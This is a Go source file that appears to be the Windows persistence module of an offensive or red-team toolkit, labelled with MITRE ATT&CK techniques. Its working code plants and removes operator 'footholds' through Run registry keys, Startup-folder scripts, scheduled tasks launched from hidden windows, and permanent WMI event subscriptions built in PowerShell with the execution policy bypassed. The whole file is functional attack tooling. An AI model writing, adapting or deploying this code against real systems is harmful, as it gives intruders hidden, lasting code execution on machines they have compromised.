//go:build windows

package persist

import (
	"bytes"
	"context"
	"encoding/csv"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

const runKeyPath = `Software\Microsoft\Windows\CurrentVersion\Run`

// ---------------------------------------------------------------------------
// Registry Run keys (T1547.001) + Startup folder (T1547.009)
// ---------------------------------------------------------------------------

func openRunKey(h Hive, write bool) (registry.Key, error) {
	var root registry.Key
	var access uint32 = registry.QUERY_VALUE | registry.ENUMERATE_SUB_KEYS
	switch h {
	case HKCU:
		root = registry.CURRENT_USER
	case HKLM:
		root = registry.LOCAL_MACHINE
	default:
		return 0, fmt.Errorf("persist: unknown hive %q (HKCU/HKLM)", h)
	}
	if write {
		access |= registry.SET_VALUE | registry.CREATE_SUB_KEY
	}
	return registry.OpenKey(root, runKeyPath, access)
}

// listRun returns the values of both Run keys (HKLM's key is world-readable).
func listRun() []Entry {
	var out []Entry
	for _, h := range []Hive{HKCU, HKLM} {
		k, err := openRunKey(h, false)
		if err != nil {
			continue // unreadable policy key — skip, do not fail the listing
		}
		names, err := k.ReadValueNames(-1)
		k.Close()
		if err != nil {
			continue
		}
		for _, n := range names {
			k, err := openRunKey(h, false)
			if err != nil {
				continue
			}
			v, _, err := k.GetStringValue(n)
			k.Close()
			if err != nil {
				continue
			}
			out = append(out, Entry{Type: TypeRun, Hive: string(h), Name: n, Command: v})
		}
	}
	return out
}

func listStartup() []Entry {
	dir, err := startupDir()
	if err != nil {
		return nil
	}
	fis, err := os.ReadDir(dir)
	if err != nil {
		return nil
	}
	var out []Entry
	for _, fi := range fis {
		if fi.IsDir() {
			continue
		}
		ext := strings.ToLower(filepath.Ext(fi.Name()))
		if ext != ".cmd" && ext != ".bat" && ext != ".lnk" && ext != ".exe" {
			continue
		}
		out = append(out, Entry{
			Type:    TypeStartup,
			Hive:    "Startup",
			Name:    strings.TrimSuffix(fi.Name(), ext),
			Command: filepath.Join(dir, fi.Name()),
		})
	}
	return out
}

// addRun writes the foothold. HKCU needs no elevation; HKLM Run does.
func addRun(h Hive, name, cmd string) error {
	k, err := openRunKey(h, true)
	if err != nil {
		return fmt.Errorf("persist: open %s\\Run for write: %v (HKLM needs an elevated token)", h, err)
	}
	defer k.Close()
	if err := k.SetStringValue(name, cmd); err != nil {
		return fmt.Errorf("persist: set %s value: %w", name, err)
	}
	return nil
}

func removeRun(h Hive, name string) error {
	k, err := openRunKey(h, true)
	if err != nil {
		return err
	}
	defer k.Close()
	_ = k.DeleteValue(name) // idempotent: a missing value is success
	return nil
}

func addStartup(name, cmd string) error {
	dir, err := startupDir()
	if err != nil {
		return err
	}
	// Modes are the tightest that still work: Windows derives the real ACL from
	// the parent directory and only honours the read-only bit here, so 0700/0600
	// costs nothing and keeps the intent explicit if this is ever ported.
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return err
	}
	return os.WriteFile(filepath.Join(dir, name+".cmd"), []byte(shimContent(cmd)), 0o600)
}

func removeStartup(name string) error {
	dir, err := startupDir()
	if err != nil {
		return err
	}
	for _, ext := range []string{".cmd", ".bat", ".lnk"} {
		_ = os.Remove(filepath.Join(dir, name+ext)) // idempotent
	}
	return nil
}

// ---------------------------------------------------------------------------
// Scheduled tasks (T1053.005)
// ---------------------------------------------------------------------------
//
// schtasks.exe is used instead of the Task Scheduler COM interface: the COM
// route (ITaskService) needs a full IDispatch implementation and a large
// dependency, while schtasks is present on every supported Windows and speaks
// a stable CLI. The child window is hidden so no console flashes.

const taskPrefix = "OBL_"

// runHiddenBudget bounds every child process this module spawns. The Task
// Scheduler and WMI are the classic Windows hang: schtasks can wedge for
// minutes behind a stuck Task Scheduler or RPCSS, and exec.Command waits with
// no deadline at all, which used to pin an HTTP handler (and its goroutine)
// for as long as the wedge lasted. Measured on a stock workstation a full
// List() takes ~5.5s, so this is a liveness bound rather than a latency target.
//
// It is a var only so a test can shrink it; nothing mutates it at runtime.
var runHiddenBudget = 20 * time.Second

// runHiddenWaitDelay bounds how long Wait may keep draining the child's pipes
// after the context is done. Killing `cmd /c …` or powershell does not kill
// what they spawned, and the inherited pipe stays open until that grandchild
// exits — without this, the timeout would still block on the pipe read.
const runHiddenWaitDelay = 2 * time.Second

// runHidden runs a child process with no visible window and returns its
// combined output within runHiddenBudget.
func runHidden(name string, args ...string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), runHiddenBudget)
	defer cancel()
	cmd := exec.CommandContext(ctx, name, args...) //#nosec G204 -- name/args are internal constants and generated task names, never operator input
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.WaitDelay = runHiddenWaitDelay
	out, err := cmd.CombinedOutput()
	if ctx.Err() == context.DeadlineExceeded {
		// Name the cause: "schtasks exit status 1" and "schtasks never came
		// back" are different problems for whoever is debugging.
		return out, fmt.Errorf("%s: timed out after %s", name, runHiddenBudget)
	}
	return out, err
}

func addTask(name, command, schedule, startTime string) error {
	sch := strings.ToUpper(strings.TrimSpace(schedule))
	if sch == "" {
		sch = "ONLOGON"
	}
	switch sch {
	case "ONLOGON", "ONSTART", "ONCE":
	default:
		return fmt.Errorf("persist: task schedule %q unsupported (ONLOGON/ONSTART/ONCE)", schedule)
	}
	args := []string{"/Create", "/TN", taskPrefix + name, "/TR", command, "/SC", sch, "/F"}
	if sch == "ONCE" {
		if strings.TrimSpace(startTime) == "" {
			return fmt.Errorf("persist: ONCE schedule needs a start time (HH:MM)")
		}
		args = append(args, "/ST", strings.TrimSpace(startTime))
	}
	out, err := runHidden("schtasks", args...)
	if err != nil {
		return fmt.Errorf("persist: schtasks create %q: %v: %s", name, err, firstLine(out))
	}
	return nil
}

func removeTask(name string) error {
	out, err := runHidden("schtasks", "/Delete", "/TN", taskPrefix+name, "/F")
	if err != nil {
		return fmt.Errorf("persist: schtasks delete %q: %v: %s", name, err, firstLine(out))
	}
	return nil
}

// listTasks parses `schtasks /Query /FO CSV /V /NH`. The column ORDER is stable
// across locales even though the header text is localised: column 1 is
// TaskName and column 8 is "Task To Run" (0 HostName, 1 TaskName, 2 Next Run
// Time, 3 Status, 4 Logon Mode, 5 Last Run Time, 6 Last Result, 7 Author,
// 8 Task To Run, …). Microsoft's own tasks are skipped.
func listTasks() []Entry {
	out, err := runHidden("schtasks", "/Query", "/FO", "CSV", "/V", "/NH")
	if err != nil {
		return nil
	}
	return parseTasksCSV(out)
}

// Column indices in the schtasks CSV, verified against real output rather than
// assumed — reading HostName/Author here silently produced garbage entries.
const (
	taskColName = 1 // TaskName
	taskColRun  = 8 // "Task To Run"
)

// parseTasksCSV turns schtasks CSV output into entries (pure, so it is unit
// tested without invoking the scheduler).
//
// schtasks does NOT emit conforming CSV: a task action that itself contains
// quotes — e.g. `""C:\Program Files\…\x.exe" /c""` — is written without
// doubling the inner quotes. Go's parser is strict by default, so the whole
// stream failed and the module reported zero scheduled tasks on every host.
// LazyQuotes tolerates it and FieldsPerRecord = -1 stops one odd row from
// aborting the list. Rows are read incrementally so a single unparseable line
// is skipped instead of discarding every other foothold.
//
// `/V` also emits one row per trigger, so a task with N triggers appears N
// times (385 rows → 268 tasks on a stock host). Entries are de-duplicated by
// task name so the foothold list is not padded with repeats.
func parseTasksCSV(out []byte) []Entry {
	r := csv.NewReader(bytes.NewReader(out))
	r.LazyQuotes = true
	r.FieldsPerRecord = -1

	var res []Entry
	seen := make(map[string]bool)
	errStreak := 0
	for {
		rec, err := r.Read()
		if err == io.EOF {
			break
		}
		if err != nil {
			// A ParseError still consumes its line, so this advances; the cap
			// is only a guard against a reader that never makes progress.
			if errStreak++; errStreak > 1000 {
				break
			}
			continue
		}
		errStreak = 0
		if len(rec) <= taskColRun {
			continue
		}
		taskName := strings.TrimSpace(rec[taskColName])
		toRun := strings.TrimSpace(rec[taskColRun])
		if taskName == "" || toRun == "" {
			continue
		}
		if strings.Contains(strings.ToLower(taskName), `\microsoft\`) {
			continue // built-in OS tasks — not operator footholds
		}
		key := strings.ToLower(taskName)
		if seen[key] {
			continue // same task, another trigger
		}
		seen[key] = true
		taskName = strings.TrimPrefix(taskName, `\`)
		res = append(res, Entry{Type: TypeTask, Hive: "TaskScheduler", Name: taskName, Command: toRun})
	}
	return res
}

// ---------------------------------------------------------------------------
// WMI event subscriptions (T1546.003)
// ---------------------------------------------------------------------------
//
// A permanent WMI subscription is a three-object graph in root\subscription:
// an __EventFilter (the trigger), a CommandLineEventConsumer (the payload) and
// a __FilterToConsumerBinding. The native route is DCOM/IDispatch; PowerShell's
// WMI cmdlets drive it in one process, so this module generates a short script
// instead of embedding a COM client. All interpolated values are single-quoted
// in the script with quotes doubled — a name can never break out of its
// literal.

const wmiNamePrefix = "OBL_"

func psRun(script string) ([]byte, error) {
	return runHidden("powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script)
}

// psQuote single-quotes a value for PowerShell, doubling embedded quotes.
func psQuote(s string) string { return "'" + strings.ReplaceAll(s, "'", "''") + "'" }

func addWMI(name, command string) error {
	consumer := wmiNamePrefix + name
	script := `$ErrorActionPreference='Stop';` +
		`$ns='root\subscription';` +
		`$q="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 180";` +
		`$f=Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{Name=` + psQuote(consumer) + `; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query=$q};` +
		`$c=Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{Name=` + psQuote(consumer) + `; CommandLineTemplate=` + psQuote(command) + `};` +
		`Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{Filter=$f; Consumer=$c};` +
		`Write-Output 'OK'`
	out, err := psRun(script)
	if err != nil {
		return fmt.Errorf("persist: WMI subscription %q: %v: %s", name, err, firstLine(out))
	}
	return nil
}

// wmiRemoveCandidates lists the consumer names to target. Operators name a
// subscription however they like, but addWMI always prefixes it, so a removal
// must reach both the verbatim name (a foreign consumer listed by listWMI has
// no prefix) and the prefixed form (what the operator actually created).
func wmiRemoveCandidates(name string) []string {
	if strings.HasPrefix(name, wmiNamePrefix) {
		return []string{name}
	}
	return []string{name, wmiNamePrefix + name}
}

// wmiRemoveScript builds the PowerShell that deletes one permanent subscription
// by consumer name.
//
// The WQL `-Filter` value must be quoted INSIDE the query, so those quote
// characters have to be part of the string PowerShell assembles —
// `("Name='" + 'x' + "'")`. Emitting `("Name=" + 'x')` produced the invalid
// query `Name=x`: WQL requires a quoted string, the query failed, and
// $ErrorActionPreference='SilentlyContinue' hid it — so the function reported
// success while leaving the filter and consumer behind. The binding survived
// removal only because it is matched with `-like`, which is not WQL.
func wmiRemoveScript(name string) string {
	q := psQuote(name)
	return `$ErrorActionPreference='SilentlyContinue';` +
		`$ns='root\subscription';` +
		`Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like ('*' + ` + q + ` + '*') -or $_.Consumer -like ('*' + ` + q + ` + '*') } | Remove-WmiObject;` +
		`Get-WmiObject -Namespace $ns -Class __EventFilter -Filter ("Name='" + ` + q + ` + "'") | Remove-WmiObject;` +
		`Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -Filter ("Name='" + ` + q + ` + "'") | Remove-WmiObject;` +
		`Write-Output 'OK'`
}

// removeWMI removes the filter, consumer and binding for every candidate name,
// then verifies the consumer is gone. The verification matters: an earlier
// implementation returned "OK" for a removal that silently did nothing.
func removeWMI(name string) error {
	cands := wmiRemoveCandidates(name)
	for _, c := range cands {
		out, err := psRun(wmiRemoveScript(c))
		if err != nil {
			return fmt.Errorf("persist: WMI removal %q: %v: %s", c, err, firstLine(out))
		}
	}
	for _, e := range listWMI() {
		for _, c := range cands {
			if strings.EqualFold(e.Name, c) {
				return fmt.Errorf("persist: WMI consumer %q still present after removal", e.Name)
			}
		}
	}
	return nil
}

// listWMI enumerates every CommandLineEventConsumer in root\subscription,
// emitting "Name|CommandLineTemplate" per line.
func listWMI() []Entry {
	script := `$ErrorActionPreference='SilentlyContinue';` +
		`Get-WmiObject -Namespace 'root\subscription' -Class CommandLineEventConsumer | ` +
		`ForEach-Object { $_.Name + '|' + $_.CommandLineTemplate }`
	out, err := psRun(script)
	if err != nil {
		return nil
	}
	return parseWMIConsumers(out)
}

// parseWMIConsumers turns the "Name|CommandLineTemplate" stream into entries
// (pure, so it is unit tested without invoking PowerShell).
func parseWMIConsumers(out []byte) []Entry {
	var res []Entry
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimRight(line, "\r")
		if strings.TrimSpace(line) == "" {
			continue
		}
		name, cmd, _ := strings.Cut(line, "|")
		name = strings.TrimSpace(name)
		if name == "" {
			continue
		}
		res = append(res, Entry{Type: TypeWMI, Hive: "WMI", Name: name, Command: strings.TrimSpace(cmd)})
	}
	return res
}

// firstLine keeps an error message to a single line for the console.
func firstLine(b []byte) string {
	s := strings.TrimSpace(string(b))
	if i := strings.IndexByte(s, '\n'); i >= 0 {
		s = s[:i]
	}
	return strings.TrimSpace(s)
}
